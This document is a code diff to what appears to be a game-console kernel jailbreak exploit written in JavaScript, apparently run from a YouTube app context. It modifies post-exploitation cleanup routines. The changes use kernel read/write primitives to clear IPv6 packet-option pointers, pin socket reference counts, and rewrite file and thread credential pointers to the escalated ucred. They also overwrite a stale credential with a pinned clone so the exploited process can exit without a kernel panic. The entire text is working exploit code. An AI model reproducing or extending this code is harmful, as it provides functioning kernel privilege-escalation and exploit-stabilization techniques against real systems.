@@ -1571,21 +1571,25 @@
                 const rc = S.kread32(fp + 0x28n);
                 if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
             };
-            const null_inpcb_pktopts = fd => {
+            const neutralize_socket_pktopts = fd => {
                 if (!S.fd_ofiles || S.fd_ofiles === 0n) return;
                 const fdent_size = BigInt(S.OFF.FILEDESCENT_SIZE || 0x30);
                 const fp = S.kread64(S.fd_ofiles + BigInt(fd) * fdent_size);
                 if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
-                const f_data = S.kread64(fp);
-                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
+                const so = S.kread64(fp);
+                if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
                 const so_pcb_off = S.OFF.SO_PCB !== undefined ? BigInt(S.OFF.SO_PCB) : 0x18n;
-                const so_pcb = S.kread64(f_data + so_pcb_off);
+                const so_pcb = S.kread64(so + so_pcb_off);
                 if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
-                // Zero the inpcb pktopts pointer so ip6_freepktopts() is never called
-                // on close. The pktopns may have been reclaimed by a kqueue; freeing it
-                // as M_IP6OPT causes a zone-mismatch panic.
                 const pktopts_off = S.OFF.INPCB_PKTOPTS !== undefined ? BigInt(S.OFF.INPCB_PKTOPTS) : 0x120n;
-                S.kwrite64(so_pcb + pktopts_off, 0n);
+                const pktopts = S.kread64(so_pcb + pktopts_off);
+                if (pktopts !== 0n && (pktopts >> 48n) === 0xFFFFn) {
+                    const rthdr_off = S.OFF.IP6PO_RTHDR !== undefined ? BigInt(S.OFF.IP6PO_RTHDR) : 0x70n;
+                    S.kwrite64(pktopts + rthdr_off, 0n);
+                }
+                // Lapse 2.0 pins socket objects after clearing dangerous pktopts
+                // links. Let close/process-exit drop refs without freeing them.
+                S.kwrite32(so + 0x00n, 0x100);
             };
 
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
@@ -1593,8 +1597,21 @@
                 if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                 bump(fp, 0x100);
             }
+
+            if (S.free_fd_idx < S.free_fds.length) {
+                const sample_fd = S.free_fds[S.free_fd_idx];
+                const sample_fp = S.kread64(S.fd_ofiles +
+                    BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
+                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
+                    const fcred = S.kread64(sample_fp + 0x10n);
+                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
+                        S.ucred_A = fcred;
+                    }
+                }
+            }
+
             for (let i = 0; i < S.ipv6_sockets.length; i++) {
-                null_inpcb_pktopts(S.ipv6_sockets[i]);
+                neutralize_socket_pktopts(S.ipv6_sockets[i]);
             }
 
             for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
@@ -1673,6 +1690,7 @@
                     return;
                 }
                 const td_ucred_off = candidates[0];
+                S.td_ucred_off = td_ucred_off;
                 await ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
                     " (1 cand, validated)");
 
@@ -2140,7 +2158,7 @@
                     "\n(jailbreak still complete)");
             } finally {
                 if (!S.kexp_pipes_handed_off) await cleanup_kexp_pipes(S);
-                if (!S.ipv6_kernel_rw_handed_off) await cleanup_ipv6_kernel_rw(S);
+                await cleanup_ipv6_kernel_rw(S);
             }
         }
 
@@ -2212,16 +2230,12 @@
 
         async function cleanup_ipv6_kernel_rw(S) {
             try {
-                if (S.ipv6_kernel_rw_handed_off) {
-                    await ulog("cleanup: ipv6_kernel_rw owned by USB elfldr - left intact");
-                    return;
-                }
                 if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
                     const d = ipv6_kernel_rw.data;
                     const so_pcb_off = S.OFF.SO_PCB !== undefined ? BigInt(S.OFF.SO_PCB) : 0x18n;
                     const pktopts_off = S.OFF.INPCB_PKTOPTS !== undefined ? BigInt(S.OFF.INPCB_PKTOPTS) : 0x120n;
 
-                    const zero_sock_pktinfo = (fd, label) => {
+                    const neutralize_sock = (fd, label) => {
                         if (fd === undefined || fd < 0) return;
                         if (!S.fd_ofiles || S.fd_ofiles === 0n) return;
                         try {
@@ -2233,13 +2247,17 @@
                             const pcb = S.kread64(so + so_pcb_off);
                             if (pcb === 0n || (pcb >> 48n) !== 0xFFFFn) return;
                             const pktopts = S.kread64(pcb + pktopts_off);
-                            if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
-                            S.kwrite64(pktopts + 0x10n, 0n);
+                            if (pktopts !== 0n && (pktopts >> 48n) === 0xFFFFn) {
+                                const rthdr_off = S.OFF.IP6PO_RTHDR !== undefined ? BigInt(S.OFF.IP6PO_RTHDR) : 0x70n;
+                                S.kwrite64(pktopts + 0x10n, 0n);
+                                S.kwrite64(pktopts + rthdr_off, 0n);
+                            }
+                            S.kwrite32(so + 0x00n, 0x100);
                         } catch (_) { }
                     };
 
-                    zero_sock_pktinfo(d.master_sock, "master_sock");
-                    zero_sock_pktinfo(d.victim_sock, "victim_sock");
+                    neutralize_sock(d.master_sock, "master_sock");
+                    neutralize_sock(d.victim_sock, "victim_sock");
 
                     if (d.pipe_addr !== undefined && d.pipe_addr !== 0n && (d.pipe_addr >> 48n) === 0xFFFFn) {
                         try {
@@ -2258,6 +2276,126 @@
             }
         }
 
+        async function post_jb_close_kp_hardening(S) {
+            try {
+                const B = S.proc_ucred;
+                if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                    await ulog("post-jb migrate: B invalid, skip");
+                } else {
+                    const nfiles = Number(S.kread32(S.fd_ofiles -
+                        S.OFF.FDESCENTTBL_HDR) & 0xFFFFFFFFn);
+                    let fd_migrated = 0;
+                    const migrated_creds = new Set();
+
+                    if (nfiles > 0 && nfiles <= 0x10000) {
+                        for (let i = 0; i < nfiles; i++) {
+                            const fp = S.kread64(S.fd_ofiles +
+                                BigInt(i) * S.OFF.FILEDESCENT_SIZE);
+                            if (fp === 0n || (fp >> 48n) !== 0xFFFFn) continue;
+                            const fcred = S.kread64(fp + 0x10n);
+                            if (fcred === B) continue;
+                            if (fcred === 0n || (fcred >> 48n) !== 0xFFFFn) continue;
+                            S.kwrite64(fp + 0x10n, B);
+                            migrated_creds.add(toHex(fcred));
+                            fd_migrated++;
+                        }
+                    }
+
+                    await ulog("post-jb migrate: " + fd_migrated +
+                        " fds f_cred -> B (" + migrated_creds.size +
+                        " distinct cred kptrs replaced)");
+
+                    const td_ucred_off = S.td_ucred_off || 0x140n;
+                    let td_migrated = 0;
+                    const migrated_tcreds = new Set();
+                    const main_thread = S.kread64(S.curproc + 0x10n);
+
+                    if (main_thread !== 0n && (main_thread >> 48n) === 0xFFFFn) {
+                        let td = main_thread, walked = 0;
+                        while (td !== 0n && (td >> 48n) === 0xFFFFn && walked < 500) {
+                            walked++;
+                            if (S.kread64(td + 0x08n) !== S.curproc) {
+                                await ulog("post-jb migrate: td_proc mismatch, abort thread walk");
+                                break;
+                            }
+                            const tu = S.kread64(td + td_ucred_off);
+                            if (tu !== B && tu !== 0n && (tu >> 48n) === 0xFFFFn) {
+                                S.kwrite64(td + td_ucred_off, B);
+                                migrated_tcreds.add(toHex(tu));
+                                td_migrated++;
+                            }
+                            td = S.kread64(td + 0x10n);
+                        }
+                    }
+
+                    await ulog("post-jb migrate: " + td_migrated +
+                        " threads td_ucred -> B (" + migrated_tcreds.size +
+                        " distinct cred kptrs replaced)");
+
+                    const total = fd_migrated + td_migrated;
+                    if (total > 0) {
+                        const rc_old = S.kread32(B) & 0xFFFFFFFFn;
+                        const rc_new = rc_old + BigInt(total);
+                        S.kwrite32(B, rc_new);
+                        await ulog("post-jb migrate: cr_ref(B) " +
+                            toHex(rc_old) + " -> " + toHex(rc_new) +
+                            " (+" + total + ")");
+                    } else {
+                        await ulog("post-jb migrate: nothing to migrate");
+                    }
+                }
+            } catch (e) {
+                await ulog("post-jb migrate: failed: " + e.message +
+                    " (jailbreak unaffected, close-KP may still fire)");
+            }
+
+            try {
+                const A = S.ucred_A || 0n;
+                const B = S.proc_ucred || 0n;
+
+                if (A === 0n || (A >> 48n) !== 0xFFFFn) {
+                    await ulog("post-jb pin: A invalid (" + toHex(A) + "), skip");
+                } else if (B === 0n || (B >> 48n) !== 0xFFFFn) {
+                    await ulog("post-jb pin: B invalid (" + toHex(B) + "), skip");
+                } else if (A === B) {
+                    await ulog("post-jb pin: A == B, skip");
+                } else {
+                    const PIN_REFS = 0x10000000;
+                    const buf = malloc(UCRED_SIZE);
+
+                    S.kread(buf, B, UCRED_SIZE);
+                    const old_A_ref = S.kread32(A) & 0xFFFFFFFFn;
+                    write32(buf, BigInt(PIN_REFS));
+                    S.kwrite(A, buf, UCRED_SIZE);
+
+                    const new_A_ref = S.kread32(A) & 0xFFFFFFFFn;
+                    if (Number(new_A_ref) === PIN_REFS) {
+                        await ulog("post-jb pin: A=" + toHex(A) +
+                            " overwritten with B-clone, cr_ref " +
+                            toHex(old_A_ref) + " -> 0x" +
+                            PIN_REFS.toString(16));
+                    } else {
+                        await ulog("post-jb pin: VERIFY FAILED, cr_ref(A)=" +
+                            toHex(new_A_ref) + " expected=0x" +
+                            PIN_REFS.toString(16));
+                    }
+                }
+            } catch (e) {
+                await ulog("post-jb pin: failed: " + e.message +
+                    " (jailbreak unaffected, close-KP may still fire)");
+            }
+
+            try {
+                const buf_before = S.kread64(S.master_pipe_data + 0x10n);
+                S.kwrite64(S.master_pipe_data + 0x10n, 0n);
+                await ulog("post-jb: master.pipe_buffer.buffer NULL'd " +
+                    "(was " + toHex(buf_before) + ")");
+            } catch (e) {
+                await ulog("post-jb: pipe_buffer restore failed: " + e.message +
+                    " (jailbreak unaffected)");
+            }
+        }
+
         async function close_cleaned_aux_fds(S) {
             try {
                 if (S.kexp_pipes && !S.kexp_pipes_handed_off) {
@@ -2268,8 +2406,7 @@
                     }
                     await ulog("cleanup: kexp pipe fds closed");
                 }
-                if (!S.ipv6_kernel_rw_handed_off &&
-                    typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+                if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
                     const d = ipv6_kernel_rw.data;
                     for (const fd of [d.master_sock, d.victim_sock, d.pipe_read_fd, d.pipe_write_fd]) {
                         if (fd !== undefined && fd >= 0) {
@@ -2357,8 +2494,7 @@
                 await expect_pipe_zero("exploit.victim_pipe", S.victim_pipe_data);
             }
 
-            if (!S.ipv6_kernel_rw_handed_off &&
-                typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+            if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
                 const d = ipv6_kernel_rw.data;
                 await verify_sock_pktinfo_zero(d.master_sock, "ipv6.master_sock");
                 await verify_sock_pktinfo_zero(d.victim_sock, "ipv6.victim_sock");
@@ -2501,9 +2637,11 @@
             throw e;
         }
 
-        // Success path: restore process-owned kernel state, then neutralize
-        // corrupted pipe buffers so YouTube can close safely.
+        // Success path: first apply MATEM6-style stale credential pinning
+        // while B is still the final post-JB ucred, then restore process-owned
+        // state and neutralize corrupted pipe buffers so YouTube can close.
         try {
+            await post_jb_close_kp_hardening(S);
             await cleanup_kernel_state(S);
             await cleanup_ipv6_kernel_rw(S);
             await cleanup_kexp_pipes(S);
